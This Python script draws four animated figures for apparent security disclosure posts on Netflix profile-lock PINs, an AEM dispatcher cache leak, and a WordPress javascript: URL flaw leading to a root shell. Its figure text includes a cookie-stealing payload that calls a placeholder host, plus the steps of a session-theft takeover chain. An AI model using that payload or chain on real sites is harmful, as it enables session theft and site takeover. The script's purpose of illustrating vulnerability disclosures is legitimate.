#!/usr/bin/env python3
"""Draw the four animated figures used by the posts.

Each one is a reconstruction drawn from the write-up's own primitives - no
screenshot, no screen recording, no customer string. Palette is deliberately
mono + red so the figures sit inside the site's black/red bands.

    assets/img/anim/01-netflix-lockpin.gif
    assets/img/anim/02-aem-dispatcher.gif
    assets/img/anim/03-wp-urlpolicy.gif
    assets/img/anim/04-click-to-root.gif

Run:  python3 assets/img/anim/make-anims.py
"""

import os
from PIL import Image, ImageDraw, ImageFont

W, H = 1200, 675
M = 64  # margin - nothing is allowed to draw outside this

BLACK = "#000000"
BODY = "#111111"
LINE = "#333333"
DIM = "#666666"
MID = "#c7c7c7"
INK = "#f6f6f6"
RED = "#ff0000"

SANS = "/usr/share/fonts/Adwaita/AdwaitaSans-Regular.ttf"
MONO_R = "/usr/share/fonts/TTF/JetBrainsMonoNerdFontMono-Regular.ttf"
MONO_B = "/usr/share/fonts/TTF/JetBrainsMonoNerdFontMono-Bold.ttf"

OUT = "/root/Docue/ppp/shoo0lin.github.io/assets/img/anim"

_fonts = {}


def sans(size, weight="Bold"):
    key = ("s", size, weight)
    if key not in _fonts:
        f = ImageFont.truetype(SANS, size)
        try:
            f.set_variation_by_name(weight)
        except Exception:
            pass
        _fonts[key] = f
    return _fonts[key]


def mono(size, bold=False):
    key = ("m", size, bold)
    if key not in _fonts:
        _fonts[key] = ImageFont.truetype(MONO_B if bold else MONO_R, size)
    return _fonts[key]


def fit(draw, text, mono_font, size, max_w, bold=False):
    got = mono(size, bold)
    while draw.textlength(text, font=got) > max_w and size > 9:
        size -= 1
        got = mono(size, bold)
    return got


def fit_sans(draw, text, size, max_w, weight="Bold"):
    got = sans(size, weight)
    while draw.textlength(text, font=got) > max_w and size > 9:
        size -= 1
        got = sans(size, weight)
    return got


class Scene:
    """A background plus the shared chrome; each frame is a fresh canvas."""

    def __init__(self, label, index):
        self.label = label
        self.index = index
        self.frames = []
        self.durations = []

    def frame(self, paint, ms=200):
        im = Image.new("RGB", (W, H), BLACK)
        d = ImageDraw.Draw(im)
        # hairline inset so the figure reads as a plate, not a crop
        d.rectangle([14, 14, W - 15, H - 15], outline=LINE)
        # corner ticks
        for x, y, dx, dy in ((14, 14, 1, 1), (W - 15, 14, -1, 1),
                             (14, H - 15, 1, -1), (W - 15, H - 15, -1, -1)):
            d.line([x, y, x + dx * 26, y], fill=RED, width=2)
            d.line([x, y, x, y + dy * 26], fill=RED, width=2)
        d.text((M, 40), "RECONSTRUCTION", font=mono(13, True), fill=DIM)
        d.text((M + 170, 40), "· NOT A CAPTURE", font=mono(13), fill=DIM)
        tag = f"{self.index:02d} / {self.label.upper()}"
        d.text((W - M, 40), tag, font=mono(13, True), fill=RED, anchor="ra")
        paint(d)
        self.frames.append(im)

    def save(self, name):
        pal = [BLACK, BODY, LINE, DIM, MID, INK, RED]
        p = Image.new("P", (1, 1))
        flat = []
        for c in pal:
            flat += [int(c[1:3], 16), int(c[3:5], 16), int(c[5:7], 16)]
        flat += [0] * (768 - len(flat))
        p.putpalette(flat)
        out = []
        for im in self.frames:
            pim = im.quantize(palette=p, dither=Image.NONE)
            out.append(pim)
        out[0].save(f"{OUT}/{name}", save_all=True, append_images=out[1:],
                    duration=self.durations, loop=0, optimize=True, disposal=2)
        kb = os.path.getsize(f"{OUT}/{name}") / 1024
        print(f"{name}: {len(out)} frames, {kb:.0f} KB")


def block(d, box, fill=BODY, outline=LINE, width=1):
    d.rectangle(box, fill=fill, outline=outline, width=width)


# ---------------------------------------------------------------- 1. netflix
def netflix():
    s = Scene("profile lock", 1)
    rows = ["owner", "protected", "kids", "spare", "guest"]
    pin_row = 1

    def paint(d, visible, reveal, open_amt, status):
        x = M
        y = 116
        f = mono(21)
        d.text((x, y - 34), "POST /graphql   ProfileLockTemplate", font=mono(15), fill=DIM)
        d.line([x, y - 8, W - M, y - 8], fill=LINE)
        for i in range(visible):
            colour = INK if i != pin_row or not reveal else RED
            d.text((x, y + i * 34), rows[i], font=f, fill=MID if i != pin_row else colour)
            right = "lockPin='0978'" if (i == pin_row and reveal) else "lockPin=None"
            rf = mono(21, reveal and i == pin_row)
            d.text((W - M, y + i * 34), right, font=rf, fill=RED if (i == pin_row and reveal) else DIM,
                   anchor="ra")
        # bracket pointing at the second row
        if reveal:
            yy = y + pin_row * 34
            d.line([x - 26, yy + 4, x - 10, yy + 4], fill=RED, width=3)
            d.line([x - 26, yy + 4, x - 18, yy - 2], fill=RED, width=3)
            d.line([x - 26, yy + 4, x - 18, yy + 10], fill=RED, width=3)

        # padlock, bottom right of the plate: body top is fixed, only the
        # shackle travels, so nothing can drift up into the rows above.
        cx, body_top = 1010, 470
        amp = open_amt
        half = 74
        col = RED if amp else MID
        d.rectangle([cx - half, body_top, cx + half, body_top + 108],
                    outline=col, width=5)
        shackle_w = 52
        top = body_top - 78 - int(amp * 30)
        d.arc([cx - shackle_w, top - 52, cx + shackle_w, top + 52],
              start=180, end=360, fill=col, width=7)
        d.line([cx - shackle_w, top, cx - shackle_w, body_top - 4 - int(amp * 40)],
               fill=col, width=7)
        d.line([cx + shackle_w, top, cx + shackle_w, body_top - 4], fill=col, width=7)
        if amp > 0.5:
            d.ellipse([cx - 10, body_top + 40, cx + 10, body_top + 60], fill=RED)

        if status:
            d.text((M, 470), status, font=mono(26, True), fill=RED)
            if status.startswith("RESULT"):
                d.text((M, 512), "(the gate took the pin, then the profile)",
                       font=mono(15), fill=DIM)

    steps = [
        (dict(visible=1, reveal=False, open_amt=0, status=None), 260),
        (dict(visible=2, reveal=False, open_amt=0, status=None), 200),
        (dict(visible=3, reveal=False, open_amt=0, status=None), 150),
        (dict(visible=5, reveal=False, open_amt=0, status=None), 200),
        (dict(visible=5, reveal=False, open_amt=0, status=None), 260),
        (dict(visible=5, reveal=True, open_amt=0, status=None), 420),
        (dict(visible=5, reveal=True, open_amt=0, status=None), 260),
        (dict(visible=5, reveal=True, open_amt=0, status=None), 180),
        (dict(visible=5, reveal=True, open_amt=0.4, status=None), 180),
        (dict(visible=5, reveal=True, open_amt=0.8, status=None), 180),
        (dict(visible=5, reveal=True, open_amt=1.0, status=None), 180),
        (dict(visible=5, reveal=True, open_amt=1.0, status=None), 180),
        (dict(visible=5, reveal=True, open_amt=1.0, status="pg=protected"), 300),
        (dict(visible=5, reveal=True, open_amt=1.0, status="RESULT: UNLOCKED"), 900),
    ]
    for kw, ms in steps:
        s.frame(lambda d, kw=kw: paint(d, **kw), ms)
        s.durations.append(ms)
    s.save("01-netflix-lockpin.gif")


# ------------------------------------------------------------------- 2. aem
def aem():
    s = Scene("dispatcher cache", 2)
    boxes = {
        "client": (M, 150, 330, 290),
        "disp": (455, 150, 745, 290),
        "origin": (870, 150, W - M, 290),
    }
    sub = {"client": "attacker", "disp": "cache key", "origin": "AEM author"}

    def paint(d, stage):
        for k, (x0, y0, x1, y1) in boxes.items():
            hit = k == "disp" and stage in (1, 2)
            miss = k == "disp" and stage >= 3
            hot = hit or miss
            block(d, [x0, y0, x1, y1], outline=RED if hot else LINE, width=2 if hot else 1)
            f = fit_sans(d, sub[k], 15, x1 - x0 - 28, weight="Medium")
            d.text(((x0 + x1) / 2, y0 + 26), sub[k], font=f, fill=DIM, anchor="ma")
            f2 = fit(d, k.split("_")[0].upper() if k != "disp" else "DISPATCHER",
                     None, 22, x1 - x0 - 28, bold=True)
            d.text(((x0 + x1) / 2, y0 + 62), {"client": "ATTACKER", "disp": "DISPATCHER",
                                              "origin": "ORIGIN"}[k],
                   font=mono(22, True), fill=INK if not hot else RED, anchor="ma")
            if k == "disp" and (hit or miss):
                d.text(((x0 + x1) / 2, y0 + 108), "HIT" if hit else "MISS",
                       font=mono(19, True), fill=RED, anchor="ma")

        u = "/libs/granite/security/currentuser.json"
        d.text((M, 316), u, font=fit(d, u, None, 16, W - 2 * M),
               fill=RED if stage >= 3 else MID)

        def arrow(y, x0, x1, colour, crossed=False):
            d.line([x0, y, x1, y], fill=colour, width=2)
            d.line([x1 - 12, y - 7, x1, y, x1 - 12, y + 7], fill=colour, width=2)
            if crossed:
                mx = (x0 + x1) // 2
                for dx in (-9, 9):
                    d.line([mx - 12, y - 12, mx + 12, y + 12], fill=RED, width=3)
                d.line([mx - 13, y + 11, mx + 13, y - 11], fill=RED, width=3)

        if stage >= 1:
            arrow(228, 340, 445, MID)
        if stage >= 3:
            arrow(228, 756, 860, DIM, crossed=True)

        y = 400
        if stage == 0:
            d.text((M, y), "cache cold ...", font=mono(22), fill=DIM)
            d.text((M, y + 46), "one anonymous GET warms the entry", font=mono(16), fill=DIM)
        elif stage in (1, 2):
            d.text((M, y), "200 OK   no session, no auth check", font=mono(22, True), fill=RED)
            body = [
                "{",
                '  "id":    "<cached login>",',
                '  "home":  "/home/users/x/xxxxx",',
                '  "name":  "<display name>"',
                "}",
            ]
            shown = 3 if stage == 1 else len(body)
            for i, ln in enumerate(body[:shown]):
                col = DIM if i in (0, 4) else INK
                d.text((M, y + 44 + i * 28), ln, font=mono(17), fill=col)
        else:
            d.text((M, y), "MISS   ?_=1 busts the key", font=mono(22, True), fill=MID)
            d.text((M, y + 42), "401 login required", font=mono(38, True), fill=RED)
            d.text((M, y + 106), "same URL, same host, one cache-key character apart",
                   font=mono(15), fill=DIM)

    seq = [(0, 420), (1, 420), (1, 240), (2, 780), (2, 300), (3, 1300)]
    for st, ms in seq:
        s.frame(lambda d, st=st: paint(d, st), ms)
        s.durations.append(ms)
    s.save("02-aem-dispatcher.gif")


# -------------------------------------------------------------------- 3. wp
def wp():
    s = Scene("url policy", 3)
    payload = "javascript:fetch('//x/'+document.cookie)"

    def paint(d, step):
        # left: server side
        L = [M, 130, 585, 470]
        R = [615, 130, W - M, 470]
        for box, title, sub in ((L, "SERVER", "wp_kses_post()"),
                                (R, "CLIENT", "data-wp-context → href")):
            block(d, box, outline=LINE)
            d.text((box[0] + 24, box[1] + 22), title, font=mono(15, True), fill=DIM)
            d.text((box[0] + 24, box[1] + 46), sub, font=mono(20, True), fill=INK)

        y = 230
        f = fit(d, payload, None, 17, 500)
        d.text((L[0] + 24, y), payload, font=f, fill=INK if step == 0 else MID)
        d.text((R[0] + 24, y), payload, font=f, fill=INK)

        if step >= 1:
            # server strikes it out - dim the ink and cut it, so the string is
            # still legible but obviously removed
            wid = d.textlength(payload, font=f)
            d.line([L[0] + 22, y + 14, L[0] + 26 + wid, y + 14], fill=RED, width=2)
            d.text((L[0] + 24, y + 40), "href=\"#\"", font=mono(19), fill=MID)
            d.text((L[0] + 24, y + 76), "STRIPPED", font=mono(26, True), fill=RED)
        if step >= 2:
            d.text((R[0] + 24, y + 40), "href=\"javascript:...\"", font=mono(19), fill=RED)
            d.text((R[0] + 24, y + 76), "SURVIVES", font=mono(26, True), fill=RED)
        # lower band: the click
        y2 = 520
        d.line([M, 500, W - M, 500], fill=LINE)
        if step >= 3:
            d.text((M, y2), "administrator clicks the link", font=mono(22), fill=INK)
        if step >= 4:
            d.text((M, y2 + 46), "→ payload runs in the administrator's own origin, "
                                 "with the administrator's own session",
                   font=mono(16), fill=RED)

    seq = [(0, 500), (1, 700), (1, 300), (2, 700), (3, 500), (4, 1100)]
    for st, ms in seq:
        s.frame(lambda d, st=st: paint(d, st), ms)
        s.durations.append(ms)
    s.save("03-wp-urlpolicy.gif")


# ------------------------------------------------------------------ 4. root
def root():
    s = Scene("click to root", 4)
    steps = [
        ("1", "Contributor stores javascript: in data-wp-context", "201 Created"),
        ("2", "Administrator opens the post", "page hydrates"),
        ("3", "one click", "cookie + nonce sent to //attacker"),
        ("4", "replay with the stolen session", "administrator REST API"),
        ("5", "theme editor", "shell written"),
    ]

    def paint(d, n, shell):
        y = 132
        for i, (num, what, how) in enumerate(steps):
            done = i < n
            cur = i == n - 1 and not shell
            col = RED if cur else (INK if done else DIM)
            d.rectangle([M, y + i * 74, M + 34, y + i * 74 + 34],
                        outline=RED if (done or cur) else LINE, width=2 if cur else 1)
            d.text((M + 17, y + i * 74 + 17), num, font=mono(16, True),
                   fill=RED if (done or cur) else DIM, anchor="mm")
            f = fit_sans(d, what, 18, 650)
            d.text((M + 56, y + i * 74 + 3), what, font=f, fill=col)
            f2 = fit(d, how, None, 14, 650)
            d.text((M + 56, y + i * 74 + 30), how, font=f2, fill=RED if cur else DIM)

        # right rail: the shell settling
        box = [846, 150, W - M, 470]
        block(d, box, outline=RED if shell else LINE, width=2 if shell else 1)
        d.text((box[0] + 20, box[1] + 16), "SHELL", font=mono(13, True), fill=DIM)
        lines = ["# id", "uid=0(root) gid=0(root)"]
        for i, ln in enumerate(lines):
            if not shell:
                continue
            d.text((box[0] + 20, box[1] + 50 + i * 30), ln,
                   font=mono(16, i == 1), fill=RED if i == 1 else MID)
        if shell:
            d.text((box[0] + 18, box[1] + 130), "confirmed on a disposable", font=mono(13), fill=DIM)
            d.text((box[0] + 18, box[1] + 150), "local WordPress, no", font=mono(13), fill=DIM)
            d.text((box[0] + 18, box[1] + 170), "production host touched", font=mono(13), fill=DIM)

    seq = [(1, False, 420), (2, False, 420), (3, False, 520), (4, False, 520),
           (5, False, 320), (5, True, 1400)]
    for n, sh, ms in seq:
        s.frame(lambda d, n=n, sh=sh: paint(d, n, sh), ms)
        s.durations.append(ms)
    s.save("04-click-to-root.gif")


if __name__ == "__main__":
    os.makedirs(OUT, exist_ok=True)
    netflix()
    aem()
    wp()
    root()
